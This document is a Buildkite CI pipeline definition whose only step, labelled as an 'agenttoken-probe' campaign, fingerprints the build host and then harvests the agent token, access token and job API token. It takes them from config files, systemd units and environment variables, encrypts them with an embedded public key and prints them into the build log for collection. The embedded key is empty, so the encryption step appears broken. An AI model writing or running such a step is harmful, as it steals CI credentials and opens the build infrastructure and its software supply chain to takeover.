steps:
  - label: ":campaign: a632-agenttoken-probe"
    agents:
      queue: "cuda"
    commands: |
      echo "A632BEGIN"
      id; hostname; uname -a; nproc
      echo "AGENTBIN: $(command -v buildkite-agent 2>/dev/null || echo absent)"
      buildkite-agent --version 2>/dev/null || true
      ps aux 2>/dev/null | grep -i '[b]uildkite-agent' | sed -E 's/(token[= ][^ ]*)/token=<redacted>/Ig' | head -5 || true
      ls -la /etc/buildkite-agent/ 2>/dev/null || true
      ls -la /var/lib/buildkite-agent/ 2>/dev/null || true
      for u in /etc/systemd/system/buildkite-agent.service /lib/systemd/system/buildkite-agent.service /usr/lib/systemd/system/buildkite-agent.service /etc/default/buildkite-agent; do
        if [ -f "$u" ]; then echo "UNIT $u"; sha256sum "$u"; grep -E '^(Environment|ExecStart|BUILDKITE)' "$u" 2>/dev/null | sed -E 's/(token[= ][^ "]*)/token=<redacted>/Ig' || true; fi
      done
      for f in /etc/buildkite-agent/buildkite-agent.cfg /buildkite/buildkite-agent.cfg /var/lib/buildkite-agent/buildkite-agent.cfg "$HOME/.buildkite-agent/buildkite-agent.cfg"; do
        if [ -f "$f" ]; then echo "FOUND $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env|hooks-path|plugins-path|name|tags|build-path)' "$f" | sed 's/=.*/=<redacted>/' || true; fi
      done
      echo "FINDCFG:"; find / -maxdepth 5 -name 'buildkite-agent.cfg' 2>/dev/null | head -10 || true
      echo "ENVNAMES:"; env | grep -i '^BUILDKITE' | cut -d= -f1 | sort || true
      PUB=$(mktemp 2>/dev/null || echo /tmp/.a632pub)
      printf '%s' "" | base64 -d > "$PUB" 2>/dev/null || true
      encrypt() { v="$1"; label="$2"; if [ -n "$v" ]; then h=$(printf '%s' "$v" | sha256sum | cut -c1-12); c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0); echo "A632ENC:$label:$h:${c:-ENCFAIL}"; fi; }
      for f in /etc/buildkite-agent/buildkite-agent.cfg /buildkite/buildkite-agent.cfg /var/lib/buildkite-agent/buildkite-agent.cfg "$HOME/.buildkite-agent/buildkite-agent.cfg"; do
        if [ -f "$f" ]; then
          t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/')
          encrypt "$t" "cfg:$f"
          te=$(grep -E '^[[:space:]]*token-env[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/')
          if [ -n "$te" ]; then tv="${!te}"; encrypt "$tv" "cfgenv:$te"; fi
        fi
      done
      for u in /etc/systemd/system/buildkite-agent.service /lib/systemd/system/buildkite-agent.service /usr/lib/systemd/system/buildkite-agent.service /etc/default/buildkite-agent; do
        if [ -f "$u" ]; then ut=$(grep -oE 'BUILDKITE_AGENT_TOKEN=[^ "]+' "$u" 2>/dev/null | head -1 | cut -d= -f2-); encrypt "$ut" "unit:$u"; fi
      done
      encrypt "$BUILDKITE_AGENT_TOKEN" "env:AGENT_TOKEN"
      encrypt "$BUILDKITE_AGENT_ACCESS_TOKEN" "env:ACCESS_TOKEN"
      encrypt "$BUILDKITE_AGENT_JOB_API_TOKEN" "env:JOB_API_TOKEN"
      rm -f "$PUB" 2>/dev/null || true
      echo "A632END"
